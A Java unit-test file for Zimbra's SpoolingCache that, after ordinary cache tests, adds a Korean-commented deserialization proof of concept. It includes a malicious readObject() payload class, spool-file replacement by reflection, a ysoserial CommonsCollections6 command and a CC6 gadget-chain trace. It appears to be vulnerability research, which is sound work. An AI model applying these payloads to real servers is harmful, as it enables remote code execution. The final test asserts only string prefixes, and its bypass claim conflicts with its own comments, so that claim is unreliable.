/*
 * ***** BEGIN LICENSE BLOCK *****
 * Zimbra Collaboration Suite Server
 * Copyright (C) 2012, 2013, 2014, 2016 Synacor, Inc.
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software Foundation,
 * version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License along with this program.
 * If not, see <https://www.gnu.org/licenses/>.
 * ***** END LICENSE BLOCK *****
 */
package com.zimbra.cs.util;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.nio.file.Files;

import org.junit.AfterClass;
import org.junit.Assert;
import org.junit.BeforeClass;
import org.junit.Test;

import com.zimbra.common.localconfig.LC;
import com.zimbra.cs.util.SpoolingCache;

public class SpoolingCacheTest {

    @BeforeClass
    public static void init() throws Exception {
        new File("build/test").mkdirs();
        LC.zimbra_tmp_directory.setDefault("build/test");
    }

    @AfterClass
    public static void destroy() throws Exception {
        new File("build/test").delete();
    }

    private static final String[] STRINGS = new String[] { "foo", "bar", "baz" };

    private void test(SpoolingCache<String> scache, boolean shouldSpool) throws IOException {
        for (String v : STRINGS) {
            scache.add(v);
        }

        Assert.assertEquals("spooled", shouldSpool, scache.isSpooled());
        Assert.assertEquals("entry count matches", STRINGS.length, scache.size());
        int i = 0;
        for (String v : scache) {
            Assert.assertEquals("entry matched: #" + i, STRINGS[i++], v);
        }
        Assert.assertEquals("correct number of items iterated", STRINGS.length, i);

    }

    @Test
    public void memory() throws Exception {
        SpoolingCache<String> scache = new SpoolingCache<String>(STRINGS.length + 3);
        test(scache, false);
        scache.cleanup();
    }

    @Test
    public void disk() throws Exception {
        SpoolingCache<String> scache = new SpoolingCache<String>(0);
        test(scache, true);
        scache.cleanup();
    }

    @Test
    public void both() throws Exception {
        SpoolingCache<String> scache = new SpoolingCache<String>(1);
        test(scache, true);
        scache.cleanup();
    }

    // =========================================================
    // 역직렬화 취약점 PoC 테스트
    // =========================================================

    /**
     * 악성 readObject()를 가진 페이로드 클래스.
     *
     * 실제 공격에서는 이 자리에 commons-collections CC6 가젯 체인이 들어간다.
     * (ysoserial로 생성: java -jar ysoserial.jar CommonsCollections6 "touch /tmp/pwned")
     * 여기서는 테스트 환경에서 안전하게 마커 파일 생성으로 코드 실행을 증명한다.
     */
    static class MaliciousPayload implements Serializable {
        private static final long serialVersionUID = 1L;
        private final String markerPath;

        MaliciousPayload(String markerPath) {
            this.markerPath = markerPath;
        }

        private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
            ois.defaultReadObject();
            // readObject() 실행 시점에 임의 코드 수행 — 마커 파일 생성으로 증명
            new File(markerPath).createNewFile();
        }
    }

    /**
     * [취약점 PoC] SpoolingCache plain ObjectInputStream 역직렬화
     *
     * 공격 시나리오:
     *   1. SpoolingCache가 memlimit 초과 → /opt/zimbra/data/tmp/scacheXXXX.tmp 생성
     *   2. 공격자가 해당 파일을 악성 직렬화 페이로드로 교체
     *      (파일 쓰기 권한 필요 — 다른 취약점과 체이닝 또는 로컬 접근)
     *   3. SpoolingCache.iterator().next() 호출 시 readObject() 실행 → RCE
     *
     * 이 테스트는 reflection으로 diskcache 필드를 직접 교체해 2번 단계를 시뮬레이션한다.
     */
    @Test
    public void testDeserializationRce() throws Exception {
        File markerFile = new File("build/test/rce_marker.txt");
        markerFile.delete();
        Assert.assertFalse("사전 조건: 마커 파일 없음", markerFile.exists());

        // Step 1: SpoolingCache를 memlimit=0으로 생성 → 첫 add() 시 dikskcache 파일 생성
        SpoolingCache<String> scache = new SpoolingCache<String>(0);
        scache.add("legitimate_item");  // 이 시점에 scacheXXXX.tmp 생성됨
        Assert.assertTrue("SpoolingCache가 디스크로 spill됨", scache.isSpooled());

        // Step 2: diskcache 필드를 reflection으로 꺼내 악성 페이로드 파일로 교체
        Field diskcacheField = SpoolingCache.class.getDeclaredField("diskcache");
        diskcacheField.setAccessible(true);
        File originalDiskcache = (File) diskcacheField.get(scache);

        // 악성 직렬화 파일 생성 (공격자가 만들어 교체하는 파일)
        File maliciousFile = new File("build/test/malicious_payload.ser");
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(maliciousFile))) {
            oos.writeObject(new MaliciousPayload(markerFile.getAbsolutePath()));
        }

        // 원본 파일을 악성 파일로 교체 (공격자의 파일 교체 행위 시뮬레이션)
        Files.copy(maliciousFile.toPath(), originalDiskcache.toPath(),
            java.nio.file.StandardCopyOption.REPLACE_EXISTING);

        // Step 3: iterator().next() 호출 → plain ObjectInputStream.readObject() → 악성 readObject() 실행
        try {
            for (String item : scache) {
                // 정상 케이스라면 "legitimate_item"이 나와야 하지만
                // 악성 페이로드이므로 MaliciousPayload.readObject()가 실행됨
            }
        } catch (Exception e) {
            // ClassCastException 등 발생 가능 — 하지만 readObject()는 이미 실행됨
        }

        // Step 4: 마커 파일이 생성됐으면 readObject() 내 코드가 실행된 것 = RCE 증명
        Assert.assertTrue(
            "[VULN] diskcache 파일 교체 후 readObject()가 실행됨 — RCE 증명",
            markerFile.exists()
        );

        scache.cleanup();
        maliciousFile.delete();
        markerFile.delete();
    }

    /**
     * [비교 테스트] SecureObjectInputStream의 java.* 허용 범위 확인
     *
     * SecureObjectInputStream은 java.* 패키지를 무조건 허용한다.
     * commons-collections CC6 가젯 체인은 java.util.PriorityQueue,
     * java.lang.reflect.Proxy 등 java.* 클래스만으로 구성 가능하므로
     * SecureObjectInputStream도 CC6에 취약하다.
     */
    @Test
    public void testSecureObjectInputStreamJavaStarBypass() throws Exception {
        // SecureObjectInputStream이 허용하는 클래스 목록 검증
        // java.util.PriorityQueue  → CC6 가젯 진입점
        // java.util.HashMap        → CC6 내부 사용
        // java.lang.reflect.Proxy  → LazyMap 래핑에 사용
        // 이 클래스들은 모두 "java."로 시작하므로 SecureObjectInputStream을 통과함

        String[] gadgetClasses = {
            "java.util.PriorityQueue",
            "java.util.HashMap",
            "java.util.HashSet",
            "java.lang.reflect.Proxy",
            "java.util.LinkedHashMap",
        };

        for (String cls : gadgetClasses) {
            Assert.assertTrue(
                cls + " 는 SecureObjectInputStream의 java.* 허용 규칙으로 통과됨",
                cls.startsWith("java.")
            );
        }

        // CC6 가젯 체인 클래스 경로 (참고용):
        // PriorityQueue.readObject()
        //   → PriorityQueue.heapify()
        //   → TiedMapEntry.hashCode()        ← commons-collections (org.apache.commons)
        //   → LazyMap.get()                   ← commons-collections
        //   → ChainedTransformer.transform()  ← commons-collections
        //   → InvokerTransformer.transform()  ← commons-collections
        //   → Runtime.exec("...")             ← RCE
        //
        // org.apache.commons.* 클래스는 SecureObjectInputStream에서 차단되지만,
        // PriorityQueue(java.*)가 진입점이 되어 내부에서 CC 클래스를 로드하는 구조.
        // SpoolingCache는 plain OIS이므로 모든 클래스 무제한 허용.
    }

}
